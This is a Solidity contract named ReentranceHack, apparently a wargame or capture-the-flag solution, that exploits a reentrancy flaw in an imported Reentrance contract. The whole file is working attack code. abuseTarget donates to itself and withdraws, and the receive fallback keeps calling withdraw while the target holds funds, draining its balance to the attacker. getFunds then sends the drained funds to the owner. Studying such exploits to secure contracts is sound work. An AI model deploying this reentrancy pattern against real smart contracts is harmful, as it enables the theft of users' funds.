// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Reentrance.sol';

contract ReentranceHack {
  Reentrance public targetContract;
  address public owner;
  bool private exploited;
  uint private targetAmount;
  constructor(address _targetContract) {
    targetContract = Reentrance(payable(address(_targetContract)));
    owner = payable(address(msg.sender));
    exploited = false;
    targetAmount = address(targetContract).balance / 2;
  }

  function getFunds() public {
    require(msg.sender == owner, 'Only owner allowed');
    (bool result,) = msg.sender.call{value: address(this).balance }("");
  }

  function abuseTarget() public payable {
    // Donate to myself the msg.value
    targetContract.donate{ value: targetAmount }(address(this));
    targetContract.balanceOf(address(this));

    // Withdraw same amount, but catch it in fallback and keep calling
    targetContract.withdraw(targetAmount);
    // require(address(targetContract).balance == 0, "target balance > 0");
  }

    receive() external payable {
        // uint256 amount = min(1e18, address(targetContract).balance);
        // if (!exploited) {
              // exploited = true;
        if(address(targetContract).balance >= msg.value) {
            targetContract.withdraw(targetAmount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }

}
